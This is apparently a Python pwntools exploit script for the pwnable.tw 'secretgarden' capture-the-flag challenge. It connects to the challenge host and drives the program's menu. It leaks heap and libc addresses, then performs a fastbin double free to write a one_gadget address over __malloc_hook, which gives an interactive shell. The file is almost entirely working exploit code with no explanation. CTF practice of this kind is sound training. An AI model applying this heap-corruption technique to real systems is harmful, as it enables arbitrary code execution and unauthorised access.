from pwn import *
#io = process('./secretgarden')
#io = remote('127.0.0.1', 4000)
io = remote('chall.pwnable.tw', 10203)

def add(size, name, color):
    io.recvuntil('choice : ')
    io.sendline('1')
    io.recvuntil('name :')
    io.sendline(str(size))
    io.recvuntil('flower :')
    io.send(name)
    io.recvuntil('flower :')
    io.sendline(color)

def visit():
    io.recvuntil('choice : ')
    io.sendline('2')

def remove(ind):
    io.recvuntil('choice : ')
    io.sendline('3')
    io.recvuntil('garden:')
    io.sendline(str(ind))

def clean():
    io.recvuntil('choice : ')
    io.sendline('4')

add(0x28, 'a',  'A')#0
add(0x310000, 'b', 'B')#1
add(0x28, 'c', 'C')#2
add(0x28, 'd', 'D')#3
add(0x28, 'e', 'E')#4
add(0x28, 'f', 'F')#5
add(0x68, 'g', 'G')#6
add(0x68, 'h', 'H')#7

remove(1)
remove(2)
remove(3)
remove(4)
clean()
#raw_input()
add(0x28, '11111111', '1')#1
add(0x28, '22222222', '2')#2
visit()
io.recvuntil('11111111')
heap = u64(io.recvline()[:-1].ljust(8, '\x00')) - 0x1140
print(hex(heap))
io.recvuntil('22222222')
libc = u64(io.recvline()[:-1].ljust(8, '\x00')) + 0x310ff0
print(hex(libc))

malloc_hook = libc + 0x3c3b10 - 0x23
one_gadget = libc + 0xef6c4
# 0x45216 0x4526a  0xef6c4 0xf0567
#pop_rax = libc + 0x8b8c5#0x000000000008ad15
remove(6)
remove(7)
remove(6)
#raw_input('!')
add(0x68, p64(malloc_hook), 'I')#3
add(0x68, 'j', 'J')#4
add(0x68, 'k', 'K')#8
add(0x68, 'x'*0x13 + p64(one_gadget), 'L')#9

io.recvuntil('choice : ')
raw_input('g')
#remove(8)
#remove(8)
io.interactive()




